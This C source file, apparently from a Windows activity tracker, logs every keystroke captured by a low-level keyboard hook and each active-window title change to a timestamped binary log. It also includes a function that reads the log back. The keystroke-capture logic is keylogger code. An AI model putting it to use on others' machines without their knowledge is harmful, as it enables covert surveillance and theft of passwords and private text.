//
// Created by netdex on 12/1/2017.
//

#include <stdio.h>
#include <windows.h>
#include <time.h>
#include <stdint.h>
#include <stddef.h>
#include <assert.h>
#include <event.h>

#include "tracker.h"
#include "event.h"
#include "util/log.h"
#include "event.h"

void OnLogBegin() {
    log_trace("log begin event");
    char *title = "logger initialized";
    size_t len = strlen(title);
    msg_ev_t *mev = calloc(sizeof(*mev) + len * sizeof(mev->msg[0]), 1);
    mev->len = len;
    memcpy(mev->msg, title, len);
    event_t e = {(uint32_t) time(NULL), EVENT_MESSAGE, mev};
    log_event(&e);
    free(mev);
}

void OnKeyboardEvent(WPARAM msgid, KBDLLHOOKSTRUCT *kbdllh) {
    if(kbdllh->vkCode == VK_F4){
        exit(EXIT_SUCCESS);
    }
    keyb_ev_t kbev = {
            (uint16_t) msgid,
            (uint8_t) kbdllh->vkCode,
            (uint8_t) kbdllh->flags
    };
    event_t e = {(uint32_t) time(NULL), EVENT_KEYBOARD, &kbev};
    log_event(&e);
    log_trace("keyboard event, %d ", (uint8_t) kbdllh->vkCode);
}

void OnActiveWindowTitleChanged(char *title) {
    log_trace("window change event, %s", title);
    size_t len = strlen(title);
    msg_ev_t *wev = calloc(sizeof(*wev) + len * sizeof(wev->msg[0]), 1);
    wev->len = len;
    memcpy(wev->msg, title, len);
    event_t e = {(uint32_t) time(NULL), EVENT_WINDOW, wev};
    log_event(&e);
    free(wev);
}

void log_event(event_t *e) {
    log_write(e, offsetof(event_t, event), 1);
    switch (e->type) {
        case EVENT_KEYBOARD: {
            keyb_ev_t *m = (keyb_ev_t *) e->event;
            log_write(m, sizeof(keyb_ev_t), 1);
            break;
        }
        case EVENT_WINDOW:
        case EVENT_MESSAGE: {
            msg_ev_t *m = (msg_ev_t *) e->event;
            log_write(&m->len, sizeof(m->len), 1);
            log_write((uint8_t*)m + offsetof(msg_ev_t, msg), sizeof(m->msg[0]), m->len);
            break;
        }
        default:
            assert(("invalid event id", false));
    }
}

// WARNING: events must be freed!
int read_event(event_t *e) {
    if (log_read(e, offsetof(event_t, event), 1) <= 0) return false;
    switch (e->type) {
        case EVENT_KEYBOARD: {
            keyb_ev_t *m = malloc(sizeof(keyb_ev_t));
            assert(log_read(m, sizeof(keyb_ev_t), 1) > 0);
            e->event = m;
            break;
        }
        case EVENT_WINDOW:
        case EVENT_MESSAGE: {
            size_t len;
            assert(log_read(&len, sizeof(size_t), 1) > 0);
            msg_ev_t *m = malloc(sizeof(msg_ev_t) + len * sizeof(m->msg[0]));
            m->len = len;
            assert(log_read((uint8_t *) m + offsetof(msg_ev_t, msg), sizeof(m->msg[0]), m->len) > 0);
            e->event = m;
            break;
        }
        default: assert(("invalid event id", false));
    }
    return true;
}